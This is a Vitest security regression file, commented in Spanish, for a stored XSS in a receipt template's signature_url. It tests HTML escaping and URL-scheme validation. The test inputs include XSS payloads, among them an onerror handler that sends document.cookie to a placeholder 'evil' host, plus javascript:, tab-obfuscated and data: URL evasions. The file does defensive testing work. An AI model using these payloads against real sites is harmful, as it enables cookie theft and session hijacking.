/**
 * Regresión de seguridad (auditoría 2026-10-02).
 *
 * C-2 / XSS almacenado en la plantilla de recibo:
 * `settings.signature_url` se interpolaba SIN escapar en
 * `recibos/page.tsx` (el `el.innerHTML = ...` de `buildReceiptPreviewEl`),
 * mientras todas las demás variables sí pasaban por `esc()`.
 * Un valor como `x" onerror="alert(1)` escapaba del atributo `src` y se
 * ejecutaba porque `next.config.ts` permite handlers inline
 * (`script-src 'self' 'unsafe-inline'`).
 *
 * Estos tests fijan el contrato en dos capas:
 *  1. `sanitizeHtml` escapa el atributo (capa de presentación).
 *  2. `sanitizeImageUrl` impide persistir esquemas ejecutables (capa de datos).
 */
import { describe, it, expect } from "vitest";
import { sanitizeHtml, sanitizeImageUrl } from "@/lib/utils";

describe("XSS almacenado via settings.signature_url", () => {
  describe("capa 1: escapado del atributo (sanitizeHtml)", () => {
    it('rompe el intento de breakout del atributo src="..."', () => {
      const payload = 'x" onerror="fetch("//evil/?c="+document.cookie)" x="';
      const escaped = sanitizeHtml(payload);

      // La comilla que cerraba el atributo ya no es una comilla.
      expect(escaped).not.toContain('"');
      expect(escaped).toContain("&quot;");

      // Invariante de seguridad real: dentro de `src="..."` no puede quedar
      // NINGÚN metacarácter capaz de cerrar el atributo ni abrir un nodo.
      // El texto "onerror=" sí sobrevive, pero como contenido inerte: al no
      // quedar comillas que lo separen del resto, no se convierte en handler.
      expect(escaped).not.toMatch(/["'<>`]/);

      // Y el payload completo se conserva como texto, no se pierde.
      expect(escaped.replace(/&quot;/g, '"')).toBe(payload);
    });

    it('rompe el intento de breakout con comilla simple', () => {
      const escaped = sanitizeHtml("x' onerror='alert(1)");
      expect(escaped).not.toContain("'");
      expect(escaped).toContain("&#039;");
    });

    it("escapa < y > para impedir inyeccion de nodos", () => {
      expect(sanitizeHtml("<img src=x onerror=alert(1)>")).toBe(
        "&lt;img src=x onerror=alert(1)&gt;"
      );
    });

    it("conserva los 5 metacaracteres HTML", () => {
      expect(sanitizeHtml(`&<>"'`)).toBe("&amp;&lt;&gt;&quot;&#039;");
    });

    it("devuelve cadena vacia para null/undefined/vacio", () => {
      expect(sanitizeHtml(null)).toBe("");
      expect(sanitizeHtml(undefined)).toBe("");
      expect(sanitizeHtml("")).toBe("");
    });

    it("no aplica escapado doble sobre texto ya escapado (idempotencia no requerida)", () => {
      // Documentamos el comportamiento real: sanitizeHtml escapa siempre.
      // No debe usarse dos veces sobre el mismo valor.
      expect(sanitizeHtml("&")).toBe("&amp;");
      expect(sanitizeHtml(sanitizeHtml("&"))).toBe("&amp;amp;");
    });
  });

  describe("capa 2: validacion de esquema (sanitizeImageUrl)", () => {
    it("acepta URLs https de almacenamiento", () => {
      const url = "https://rexebvnzgnnrxhxmwayx.supabase.co/storage/v1/object/public/sig/firma.png";
      expect(sanitizeImageUrl(url)).toBe(url);
    });

    it("acepta http", () => {
      expect(sanitizeImageUrl("http://example.com/a.png")).toBe("http://example.com/a.png");
    });

    it("acepta rutas relativas del bucket", () => {
      expect(sanitizeImageUrl("/storage/v1/object/public/sig/a.png")).toBe(
        "/storage/v1/object/public/sig/a.png"
      );
    });

    it("acepta data-URL de imagen raster", () => {
      const d = "data:image/png;base64,iVBORw0KGgo=";
      expect(sanitizeImageUrl(d)).toBe(d);
    });

    it("RECHAZA javascript:", () => {
      expect(sanitizeImageUrl("javascript:alert(1)")).toBe("");
      expect(sanitizeImageUrl("JavaScript:alert(1)")).toBe("");
      expect(sanitizeImageUrl("  javascript:alert(1)  ")).toBe("");
    });

    it("RECHAZA javascript: con tabulador intercalado (evasion de allowlist)", () => {
      // Los navegadores ignoran el tabulador al resolver el esquema.
      const sneaky = "java\tscript:alert(1)";
      expect(sanitizeImageUrl(sneaky)).toBe("");
      const sneaky2 = "java\nscript:alert(1)";
      expect(sanitizeImageUrl(sneaky2)).toBe("");
    });

    it("RECHAZA vbscript:", () => {
      expect(sanitizeImageUrl("vbscript:msgbox(1)")).toBe("");
    });

    it("RECHAZA data:text/html", () => {
      expect(sanitizeImageUrl("data:text/html,<script>alert(1)</script>")).toBe("");
    });

    it("RECHAZA data:image/svg+xml (SVG puede llevar script)", () => {
      expect(sanitizeImageUrl("data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=")).toBe("");
    });

    it("no acepta esquemas relativos sin barra inicial (p.ej. 'evil.com/x.png')", () => {
      // Sin esquema y sin barra inicial, el navegador lo resuelve como ruta
      // relativa; lo rechazamos para ser estrictos y no alterar nada existente
      // (las URLs reales guardadas son https o /bucket/path).
      expect(sanitizeImageUrl("evil.com/x.png")).toBe("");
    });

    it("devuelve cadena vacia para null/undefined/vacio", () => {
      expect(sanitizeImageUrl(null)).toBe("");
      expect(sanitizeImageUrl(undefined)).toBe("");
      expect(sanitizeImageUrl("")).toBe("");
      expect(sanitizeImageUrl("   ")).toBe("");
    });

    it("normaliza espacios exteriores sin alterar la URL valida", () => {
      expect(sanitizeImageUrl("  https://a.com/b.png  ")).toBe("https://a.com/b.png");
    });
  });
});
